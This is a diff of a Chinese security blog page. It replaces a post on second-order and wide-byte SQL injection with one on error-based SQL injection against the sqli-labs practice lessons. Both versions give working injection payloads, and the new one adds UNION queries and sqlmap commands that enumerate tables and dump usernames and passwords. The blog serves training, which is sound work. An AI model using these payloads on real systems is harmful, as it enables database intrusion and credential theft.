@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>SQL注入 几种特殊的注入 - Cheekkk&#39;s Blog</title>
+  <title>SQL注入 基于报错的注入 - Cheekkk&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -136,7 +136,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    475 字
+                    493 字
                   </span>
                 
 
@@ -146,7 +146,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    5
+                    7
                      分钟
                   </span>
                 
@@ -175,41 +175,59 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>本文介绍了二次注入、宽字节注入</p>
+              <p>本文简单介绍了最基础的SQL注入</p>
 <a id="more"></a>
 
-<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="01-二次注入介绍"><a href="#01-二次注入介绍" class="headerlink" title="01 二次注入介绍"></a>01 二次注入介绍</h2><ol>
-<li>先构造语句（此语句含有被转义字符的语句）</li>
-<li>将我们构造的恶意语句存入数据库；</li>
-<li>第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有已存入的数据做检查，成功注入）</li>
-</ol>
-<h2 id="02-二次注入利用"><a href="#02-二次注入利用" class="headerlink" title="02 二次注入利用"></a>02 二次注入利用</h2><p><strong>Lesson 24</strong></p>
+<h1 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h1><h2 id="01-SQL注入的分类"><a href="#01-SQL注入的分类" class="headerlink" title="01 SQL注入的分类"></a>01 SQL注入的分类</h2><p>数字型：select * from table where id=输入id</p>
+<p>字符型：select * from table where id=’输入id’</p>
+<h2 id="02-GET基于报错的SQL注入发现"><a href="#02-GET基于报错的SQL注入发现" class="headerlink" title="02 GET基于报错的SQL注入发现"></a>02 GET基于报错的SQL注入发现</h2><p>通过url中修改对应的ID值，为正常数字、大数字、字符(单引号、双引号、括号)、反斜杠等来探测</p>
+<p><strong>Sqli-lab lesson1-4</strong></p>
 <ol>
-<li>注册用户名 admin’ – -<br>密码123456</li>
-<li>进行登录</li>
-<li>修改密码为112233</li>
-<li>成功将admin的密码修改为112233<br>而admin’ – -的密码没有改变</li>
+<li>Lesson1：<ol>
+<li>输入?id=1</li>
+<li>添加单引号 ?id=1 ‘ 出现报错 ‘1’’ LIMIT 0,1</li>
+<li>猜测sql语句为<br>select username,password from admin where id=’id’ limit 0,1</li>
 </ol>
-<h2 id="03-二次注入危害"><a href="#03-二次注入危害" class="headerlink" title="03 二次注入危害"></a>03 二次注入危害</h2><ol>
-<li>注入payload触发二次sql注入</li>
-<li>注入payload触发xss攻击</li>
+</li>
+<li>Lesson2:<ol>
+<li>输入?id=1</li>
+<li>添加单引号 ?id=1 ‘ 出现报错 ‘ LIMIT 0,1</li>
+<li>猜测sql语句为<br>select username,password from admin where id=id limit 0,1</li>
 </ol>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入适用于单引号被转义为\‘的场景，原理是将反斜杠拼接成一个宽字符，从而避免单引号被转义</p>
-<h2 id="01-宽字节注入基础"><a href="#01-宽字节注入基础" class="headerlink" title="01 宽字节注入基础"></a>01 宽字节注入基础</h2><p>GBK编码 占用两字节，ASCII编码占用一个字节</p>
-<p>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集</p>
-<p>如果PHP中有addslashes函数，单引号就会被转义为\‘，通常使用%DF进行宽字符注入绕过，’URL编码是%27，\URL编码是%5C，即%DF\‘会被转为%DF%5C%27</p>
-<p>若网站的字符集是GBK，MYSQL使用的编码也是GBK，就会认为%DF%5C是一个宽字符,从而解析为 <strong>宽字符’</strong></p>
-<p>最常使用的宽字节注入是%DF，其实只要用ascii码大于128的即可</p>
-<p>%81-%FE均可注入<strong>（%7F除外）</strong></p>
-<p><strong>ascii码转码方法</strong></p>
-<p>如ascii码为129，先将129转为十六进制，即为0x81，然后加%即可，%81</p>
-<h2 id="02-绕过演示"><a href="#02-绕过演示" class="headerlink" title="02 绕过演示"></a>02 绕过演示</h2><p><strong>Lesson 32</strong></p>
-<p>?id=-1%DF’ union select 1,database(),user() –+</p>
-<p><strong>Lesson 33</strong></p>
-<p>?id=-1%DF’ union select 1,database(),user() –+</p>
-<h2 id="03-sqlmap安全测试"><a href="#03-sqlmap安全测试" class="headerlink" title="03 sqlmap安全测试"></a>03 sqlmap安全测试</h2><p>sqlmap -u “URL?id=%df%27”</p>
-<p><strong>用于宽字节注入的脚本 unmagicquotes.py</strong></p>
-<p>sqlmap -u “URL?id=1” –tamper=unmagicquotes.py</p>
+</li>
+<li>Lesson3:<ol>
+<li>输入?id=1</li>
+<li>添加单引号 ?id=1 ‘ 出现报错 ‘1’’) LIMIT 0,1</li>
+<li>猜测sql语句为<br>select username,password from admin where id=(‘id’) limit 0,1</li>
+<li>输入?id=1’) –+  得到返回值，说明猜测正确</li>
+</ol>
+</li>
+<li>Lesson4:<ol>
+<li>输入?id=1</li>
+<li>添加单引号 ?id=1 ‘不报错</li>
+<li>添加括号 ?id=1) 不报错</li>
+<li>猜测使用了双引号闭合</li>
+<li>使用?id=1”或?id=1\ 报错 “1\“) LIMIT 0,1</li>
+<li>猜测sql语句为<br>select username,password from admin where id=(“id”) limit 0,1</li>
+<li>输入?id=1”) –+  得到返回值，说明猜测正确</li>
+</ol>
+</li>
+</ol>
+<h2 id="03-GET基于报错的SQL注入漏洞利用"><a href="#03-GET基于报错的SQL注入漏洞利用" class="headerlink" title="03 GET基于报错的SQL注入漏洞利用"></a>03 GET基于报错的SQL注入漏洞利用</h2><p>Lesson 1:</p>
+<ol>
+<li>?id=1’ order by 3 –+<br>判断字段数,得到字段数为3</li>
+<li>?id=-1’ union select 1,2,3 –+<br>需要使前一个查询报错，得到name是第2列，password是第3列</li>
+<li>?id=-1’ union select 1,version(),database() –+<br>使用聚合函数得到版本和数据库</li>
+<li>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+<br>得到表名</li>
+<li>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+<br>得到字段名</li>
+<li>?id=-1’ union select 1,group_concat(username,0x3a,password),3 from users –+<br>得到字段值</li>
+</ol>
+<h2 id="04-利用sqlmap进行探测"><a href="#04-利用sqlmap进行探测" class="headerlink" title="04 利用sqlmap进行探测"></a>04 利用sqlmap进行探测</h2><ol>
+<li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li>
+<li>sqlmap -u url -D security –tables –batch<br>得到表有users</li>
+<li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li>
+<li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li>
+</ol>
 
             </article>
             <hr>
@@ -242,9 +260,9 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">
+                      <a href="/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SQL注入 文件读写</span>
+                        <span class="hidden-mobile">SQL注入 SQLmap的使用方法</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -252,8 +270,8 @@
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
-                        <span class="hidden-mobile">SQL注入 SQLmap的使用方法</span>
+                      <a href="/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">
+                        <span class="hidden-mobile">SQL注入 盲注</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -393,7 +411,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "SQL注入 几种特殊的注入&nbsp;",
+        "SQL注入 基于报错的注入&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
